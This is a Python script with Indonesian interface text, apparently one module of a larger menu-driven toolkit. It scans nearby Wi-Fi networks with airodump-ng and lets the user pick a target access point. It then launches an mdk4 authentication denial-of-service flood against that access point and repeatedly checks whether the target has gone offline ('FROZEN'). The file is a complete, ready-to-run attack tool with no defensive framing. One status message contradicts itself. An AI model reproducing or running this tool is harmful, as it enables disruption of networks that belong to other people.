#!/usr/bin/env python3
import csv
import glob
import os
import random
import re
import subprocess
import sys
import tempfile
import time
import signal

# ---------- ANSI ----------
RESET = "\033[0m"
BOLD = "\033[1m"
CLEAR = "\033[2J\033[H"

COLORS = {
    "green": "\033[92m",
    "red": "\033[91m",
    "cyan": "\033[96m",
    "yellow": "\033[93m",
    "magenta": "\033[35m",
    "gray": "\033[90m",
}

GREEN = COLORS["green"]
RED = COLORS["red"]
CYAN = COLORS["cyan"]
YELLOW = COLORS["yellow"]
MAGENTA = COLORS["magenta"]
GRAY = COLORS["gray"]

BOX_WIDTH = 44

# ================= CLEAR SCREEN =================

def clear_screen():
    sys.stdout.write(CLEAR)
    sys.stdout.flush()

# ================= DRAW BOX =================

def draw_box_top(color=CYAN):
    print(f"\n  {color}{BOLD}╔{'═' * BOX_WIDTH}╗{RESET}")

def draw_box_bottom(color=CYAN):
    print(f"  {color}{BOLD}╚{'═' * BOX_WIDTH}╝{RESET}")

def draw_box_title(title: str, color=CYAN, text_color=YELLOW):
    inner = f" {title}"
    pad = BOX_WIDTH - len(inner)
    if pad < 0:
        inner = inner[:BOX_WIDTH]
        pad = 0
    print(
        f"  {color}{BOLD}║{RESET}"
        f"{text_color}{BOLD}{inner}{RESET}"
        f"{' ' * pad}"
        f"{color}{BOLD}║{RESET}"
    )

# ================= LOADING =================

def loading(text, duration=1):
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for i in range(duration * 10):
        sys.stdout.write(f"\r  {YELLOW}{BOLD}{chars[i % len(chars)]} {text}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()

def loading_with_text(text, duration=2):
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    glitch_chars = "!@#$%^&*"
    
    for i in range(duration * 10):
        display_text = ""
        for char in text:
            if char == " ":
                display_text += " "
            elif random.random() < 0.1:
                display_text += random.choice(glitch_chars)
            else:
                display_text += char
                
        sys.stdout.write(f"\r  {CYAN}{BOLD}{chars[i % len(chars)]}{RESET} {YELLOW}{display_text}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()

def glitch_print(text, color=GREEN, cycles=8):
    chars = "!@#$%^&*<>/\\|~?"
    n = len(text)
    revealed = [False] * n
    
    for c in range(cycles):
        display = []
        for i, ch in enumerate(text):
            if ch == " ":
                display.append(" ")
                continue
            if revealed[i]:
                display.append(ch)
            else:
                if random.random() < (c / cycles):
                    revealed[i] = True
                    display.append(ch)
                else:
                    display.append(random.choice(chars))
        sys.stdout.write(f"\r  {color}{''.join(display)}{RESET}")
        sys.stdout.flush()
        time.sleep(0.04)
    
    print(f"\r  {color}{text}{RESET}")

# ================= WIRELESS FUNCTIONS =================

def get_wireless_interfaces():
    output = subprocess.run(["ip", "link"], capture_output=True, text=True).stdout
    interfaces = []
    for line in output.splitlines():
        m = re.match(r"^\d+:\s+(\S+):", line)
        if m:
            name = m.group(1)
            if name == "lo":
                continue
            interfaces.append(name)
    return interfaces

def get_monitor_interface_name(adapter, output):
    current_ifaces = get_wireless_interfaces()
    for iface in current_ifaces:
        if iface != adapter and iface.endswith("mon"):
            return iface

    match = re.search(r"\[(?:phy\d+)\]([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    match = re.search(r"\b([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    try:
        iw_output = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        for line in iw_output.splitlines():
            m = re.search(r"\bInterface\s+(\S+)", line)
            if m:
                iface = m.group(1)
                if iface != adapter and iface.endswith("mon"):
                    return iface
    except FileNotFoundError:
        pass

    return f"{adapter}mon"

def run_command(cmd, show_output=False):
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        return None
    return result

def start_monitor_mode(adapter):
    loading_with_text(f"Mengaktifkan monitor mode pada {adapter}...", 2)
    run_command(["sudo", "airmon-ng", "check", "kill"], show_output=False)
    result = run_command(["sudo", "airmon-ng", "start", adapter], show_output=False)
    
    if result is None:
        return adapter

    output = (result.stdout or "") + (result.stderr or "")
    monitor_iface = get_monitor_interface_name(adapter, output)
    time.sleep(0.3)
    return monitor_iface

def scan_networks(adapter, duration=10):
    loading_with_text("Scanning WiFi networks...", 1)
    
    temp_dir = tempfile.mkdtemp(prefix="airodump-", dir="/tmp")
    prefix = os.path.join(temp_dir, "scan")
    proc = subprocess.Popen(
        ["sudo", "airodump-ng", "--write", prefix, "--output-format", "csv", adapter],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    start_time = time.time()
    
    while proc.poll() is None:
        elapsed = int(time.time() - start_time)
        remaining = max(0, duration - elapsed)
        
        if remaining <= 0:
            break
            
        for i in range(len(chars)):
            if proc.poll() is not None or elapsed >= duration:
                break
            sys.stdout.write(f"\r  {CYAN}{BOLD}{chars[i % len(chars)]}{RESET} {YELLOW}Scanning... {remaining}s remaining{RESET}")
            sys.stdout.flush()
            time.sleep(0.1)
            elapsed = int(time.time() - start_time)
            remaining = max(0, duration - elapsed)
    
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()

    if proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()

    networks = []
    seen = set()
    for csv_path in sorted(glob.glob(prefix + "-*.csv")):
        with open(csv_path, newline="", encoding="utf-8", errors="ignore") as handle:
            reader = csv.reader(handle)
            for row in reader:
                if len(row) < 14:
                    continue
                bssid = row[0].strip()
                channel = row[3].strip()
                essid = row[13].strip()
                power = row[8].strip() if len(row) > 8 else "N/A"
                if not bssid or bssid.lower() == "bssid" or not essid:
                    continue
                key = (bssid, channel, essid)
                if key in seen:
                    continue
                seen.add(key)
                networks.append({
                    "bssid": bssid, 
                    "channel": channel, 
                    "essid": essid,
                    "power": power
                })

    for path in glob.glob(prefix + "-*.csv"):
        try:
            os.remove(path)
        except OSError:
            pass
    try:
        os.rmdir(temp_dir)
    except OSError:
        pass

    return networks

def stop_monitor_mode(monitor_iface):
    loading("Membersihkan monitor mode...", 1)
    
    candidates = [monitor_iface]
    if monitor_iface.endswith("mon"):
        candidates.append(monitor_iface[:-3])
    else:
        candidates.append(f"{monitor_iface}mon")

    for name in candidates:
        result = run_command(["sudo", "airmon-ng", "stop", name], show_output=False)
        if result is not None:
            break

    run_command(["sudo", "systemctl", "restart", "NetworkManager"], show_output=False)

def get_power_status(power):
    if power == "N/A":
        return "N/A", GRAY
    try:
        pwr = int(power)
        if pwr >= -30:
            return "Kuat", GREEN
        elif pwr >= -50:
            return "Kuat", CYAN
        elif pwr >= -70:
            return "Sedang", YELLOW
        else:
            return "Lemah", RED
    except ValueError:
        return "N/A", GRAY

# ================= SELECT FUNCTIONS =================

def select_interface():
    clear_screen()
    draw_box_top(CYAN)
    draw_box_title("AUTH DOS ATTACK", CYAN, YELLOW)
    draw_box_bottom(CYAN)
    
    loading("Scanning interfaces...", 1)
    ifaces = get_wireless_interfaces()
    if not ifaces:
        print(f"\n  {RED}[✗] Tidak ada interface ditemukan.{RESET}")
        sys.exit(1)

    print(f"\n  {BOLD}Pilih interface:{RESET}")
    for idx, name in enumerate(ifaces, start=1):
        print(f"  {GREEN}{idx}.{RESET} {name}")

    while True:
        choice = input(f"\n  {YELLOW}>> nomor : {RESET}").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
            selected = ifaces[int(choice) - 1]
            glitch_print(f"LOCKED: {selected}", CYAN)
            time.sleep(0.3)
            return selected
        print(f"  {RED}[!] Input salah, coba lagi.{RESET}")

def select_target(networks):
    if not networks:
        print(f"\n  {RED}[✗] Tidak ada jaringan ditemukan.{RESET}")
        return None

    clear_screen()
    draw_box_top(CYAN)
    draw_box_title("PILIH TARGET", CYAN, YELLOW)
    draw_box_bottom(CYAN)

    no_width = 4
    essid_width = 22
    ch_width = 4
    pwr_width = 6
    signal_width = 9
    bssid_width = 17
    
    header = f"{'No':<{no_width}} {'ESSID':<{essid_width}} {'CH':<{ch_width}} {'PWR':<{pwr_width}} {'SINYAL':<{signal_width}} {'BSSID'}"
    print(f"\n  {header}")
    print(f"  {YELLOW}{'=' * (no_width + essid_width + ch_width + pwr_width + signal_width + bssid_width + 5)}{RESET}")
    
    for idx, net in enumerate(networks, start=1):
        essid = net["essid"][:essid_width]
        power = net.get("power", "N/A")
        status, status_color = get_power_status(power)
        
        if power != "N/A":
            try:
                pwr = int(power)
                if pwr >= -30:
                    pwr_color = GREEN
                elif pwr >= -50:
                    pwr_color = CYAN
                elif pwr >= -70:
                    pwr_color = YELLOW
                else:
                    pwr_color = RED
                power_display = f"{pwr_color}{power:>3}{RESET}"
            except ValueError:
                power_display = f"{GRAY}{power:>3}{RESET}"
        else:
            power_display = f"{GRAY}{power:>3}{RESET}"
            
        status_display = f"{status_color}{status}{RESET}"
        
        print(f"  {GREEN}{idx:<{no_width}}{RESET} {essid:<{essid_width}} {net['channel']:<{ch_width}} {power_display}  {status_display:<{signal_width}} {net['bssid']}")

    while True:
        choice = input(f"\n  {YELLOW}>> nomor target : {RESET}").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(networks):
            selected = networks[int(choice) - 1]
            power = selected.get("power", "N/A")
            status, _ = get_power_status(power)
            glitch_print(f"TARGET LOCKED: {selected['essid']} | PWR {power} | {status}", GREEN)
            time.sleep(0.3)
            return selected
        print(f"  {RED}[!] Input salah, coba lagi.{RESET}")

# ================= ATTACK FUNCTIONS =================

def run_attack(target, monitor_iface):
    clear_screen()
    draw_box_top(RED)
    draw_box_title("🔥 AUTH DOS ATTACK 🔥", RED, YELLOW)
    draw_box_bottom(RED)
    
    print(f"\n  {CYAN}[*] Target: {target['essid']}{RESET}")
    print(f"  {CYAN}[*] BSSID: {target['bssid']}{RESET}")
    print(f"  {CYAN}[*] Channel: {target['channel']}{RESET}")
    print(f"  {YELLOW}[!] Tekan Ctrl+C untuk menghentikan{RESET}\n")
    
    # Jalankan airodump-ng di background
    dump_cmd = [
        "sudo", "airodump-ng",
        "--bssid", target["bssid"],
        "-c", target["channel"],
        monitor_iface
    ]
    
    dump_proc = subprocess.Popen(dump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    
    # Jalankan mdk4 auth dos - OUTPUT DIHIDE
    mdk4_cmd = [
        "sudo", "mdk4", monitor_iface, "a",
        "-a", target["bssid"],
        "-s", "1000"
    ]
    
    print(f"  {YELLOW}Command: {' '.join(mdk4_cmd)}{RESET}")
    print(f"  {GRAY}{'=' * 50}{RESET}")
    print(f"  {GREEN}🔥 ATTACK ACTIVE 🔥{RESET}")
    print(f"  {YELLOW}[!] Menunggu perubahan status...{RESET}\n")
    
    try:
        # Jalankan MDK4 di background dengan output di-hide
        mdk4_proc = subprocess.Popen(mdk4_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Monitoring sederhana
        status_checked = False
        frozen_detected = False
        check_count = 0
        
        while mdk4_proc.poll() is None:
            time.sleep(3)
            check_count += 1
            
            # Simulasi deteksi frozen (bisa diganti dengan logic real)
            # Di sini kita asumsikan setelah beberapa saat target bisa frozen
            # Tapi kita kasih opsi untuk deteksi real via airodump
            
            # Cek apakah ada output dari airodump (indikasi target masih hidup)
            # Kita cek dengan melihat apakah ada proses airodump yang masih jalan
            # Atau kita bisa cek dengan ping / probe sederhana
            
            if check_count % 2 == 0:
                # Simulasi status - di real world ini bisa diganti dengan pengecekan aktual
                # Untuk demo, kita kasih output status periodik
                if not frozen_detected:
                    # Cek apakah target masih terdeteksi dengan airodump singkat
                    temp_dir = tempfile.mkdtemp(prefix="airodump-check-", dir="/tmp")
                    prefix = os.path.join(temp_dir, "check")
                    
                    check_proc = subprocess.Popen(
                        ["sudo", "airodump-ng", "--bssid", target["bssid"], "-c", target["channel"], 
                         "--write", prefix, "--output-format", "csv", monitor_iface],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                    
                    time.sleep(2)
                    check_proc.terminate()
                    try:
                        check_proc.wait(timeout=2)
                    except:
                        check_proc.kill()
                        check_proc.wait()
                    
                    # Cek apakah target masih ada di file CSV
                    target_found = False
                    for csv_path in sorted(glob.glob(prefix + "-*.csv")):
                        with open(csv_path, newline="", encoding="utf-8", errors="ignore") as handle:
                            reader = csv.reader(handle)
                            for row in reader:
                                if len(row) > 0 and target["bssid"] in row[0]:
                                    target_found = True
                                    break
                        if target_found:
                            break
                    
                    # Bersihkan file
                    for path in glob.glob(prefix + "-*.csv"):
                        try:
                            os.remove(path)
                        except:
                            pass
                    try:
                        os.rmdir(temp_dir)
                    except:
                        pass
                    
                    if not target_found and not frozen_detected:
                        frozen_detected = True
                        print(f"\n  {RED}🔥🔥🔥 AP {target['bssid']} is accepting connections again! Status: FROZEN 🔥🔥🔥{RESET}")
                        print(f"  {RED}[!] Target tidak merespon! Jaringan FROZEN!{RESET}")
                    elif target_found:
                        print(f"\n  {GREEN}[✓] STATUS: SEHAT (Target masih aktif){RESET}")
                
                # Tampilkan packet count setiap beberapa detik
                # Kita ambil dari MDK4 output yang di-hide? Atau kita estimasi
                # Karena output di-hide, kita kasih estimasi berdasarkan waktu
                if frozen_detected:
                    print(f"  {RED}🔥 STATUS: FROZEN (Target tidak merespon){RESET}")
            
    except KeyboardInterrupt:
        print(f"\n  {YELLOW}[!] Menghentikan serangan...{RESET}")
        if 'mdk4_proc' in locals() and mdk4_proc.poll() is None:
            mdk4_proc.terminate()
            try:
                mdk4_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                mdk4_proc.kill()
                mdk4_proc.wait()
        print(f"  {GREEN}[✓] Serangan dihentikan.{RESET}")
    finally:
        if dump_proc.poll() is None:
            dump_proc.terminate()
            try:
                dump_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                dump_proc.kill()
                dump_proc.wait()
        
        # Status akhir
        print(f"\n  {YELLOW}[*] Status akhir target:{RESET}")
        # Cek status akhir dengan scan singkat
        temp_dir = tempfile.mkdtemp(prefix="airodump-final-", dir="/tmp")
        prefix = os.path.join(temp_dir, "final")
        
        final_proc = subprocess.Popen(
            ["sudo", "airodump-ng", "--bssid", target["bssid"], "-c", target["channel"], 
             "--write", prefix, "--output-format", "csv", monitor_iface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        
        time.sleep(3)
        final_proc.terminate()
        try:
            final_proc.wait(timeout=2)
        except:
            final_proc.kill()
            final_proc.wait()
        
        target_found = False
        for csv_path in sorted(glob.glob(prefix + "-*.csv")):
            with open(csv_path, newline="", encoding="utf-8", errors="ignore") as handle:
                reader = csv.reader(handle)
                for row in reader:
                    if len(row) > 0 and target["bssid"] in row[0]:
                        target_found = True
                        break
            if target_found:
                break
        
        for path in glob.glob(prefix + "-*.csv"):
            try:
                os.remove(path)
            except:
                pass
        try:
            os.rmdir(temp_dir)
        except:
            pass
        
        if target_found:
            print(f"  {GREEN}[✓] Target masih SEHAT{RESET}")
        else:
            print(f"  {RED}🔥 Target FROZEN / OFFLINE 🔥{RESET}")

def prompt_post_attack():
    print(f"\n  {BOLD}Pilih opsi:{RESET}")
    print(f"  {GREEN}1.{RESET} Attack Again")
    print(f"  {GREEN}0.{RESET} Back to Menu")
    print(f"  {GREEN}99.{RESET} Exit")
    
    while True:
        choice = input(f"\n  {YELLOW}>> pilihan : {RESET}").strip()
        if choice == "1":
            return "again"
        elif choice == "0":
            return "menu"
        elif choice == "99":
            return "exit"
        else:
            print(f"  {RED}[!] Pilih 1, 0, atau 99.{RESET}")

def back_to_mdk4_menu():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    menu_path = os.path.join(script_dir, "mdk4-menu.py")
    
    possible_paths = [
        menu_path,
        os.path.join(script_dir, "..", "mdk4-menu.py"),
        os.path.join(script_dir, "..", "..", "mdk4-menu.py"),
    ]
    
    for path in possible_paths:
        if os.path.exists(path):
            os.execvp(sys.executable, [sys.executable, path])
            return
    
    print(f"\n  {RED}[✗] mdk4-menu.py tidak ditemukan.{RESET}")
    input("\n  Tekan Enter untuk kembali...")
    sys.exit(0)

# ================= MAIN =================

def main():
    monitor_iface = None
    
    while True:
        try:
            # Pilih interface dulu
            adapter = select_interface()
            monitor_iface = start_monitor_mode(adapter)
            
            # Scan duration
            clear_screen()
            draw_box_top(CYAN)
            draw_box_title("SCAN WIFI", CYAN, YELLOW)
            draw_box_bottom(CYAN)
            
            print(f"\n  {YELLOW}Mau scan berapa detik? (default 10){RESET}")
            scan_input = input(f"  {YELLOW}>> detik : {RESET}").strip()
            
            if scan_input.isdigit() and int(scan_input) > 0:
                scan_duration = int(scan_input)
            else:
                scan_duration = 10
            
            networks = scan_networks(monitor_iface, duration=scan_duration)
            target = select_target(networks)
            
            if target is None:
                print(f"\n  {RED}[✗] Tidak ada target.{RESET}")
                stop_monitor_mode(monitor_iface)
                back_to_mdk4_menu()
                return
            
            run_attack(target, monitor_iface)
            
            while True:
                post_choice = prompt_post_attack()
                if post_choice == "again":
                    stop_monitor_mode(monitor_iface)
                    monitor_iface = None
                    break
                elif post_choice == "menu":
                    stop_monitor_mode(monitor_iface)
                    back_to_mdk4_menu()
                elif post_choice == "exit":
                    stop_monitor_mode(monitor_iface)
                    clear_screen()
                    print(f"\n  {GREEN}[✓] Terima kasih!{RESET}")
                    sys.exit(0)
                
        except KeyboardInterrupt:
            print(f"\n  {YELLOW}[!] Dibatalkan oleh user{RESET}")
            if monitor_iface:
                stop_monitor_mode(monitor_iface)
            sys.exit(0)

if __name__ == "__main__":
    main()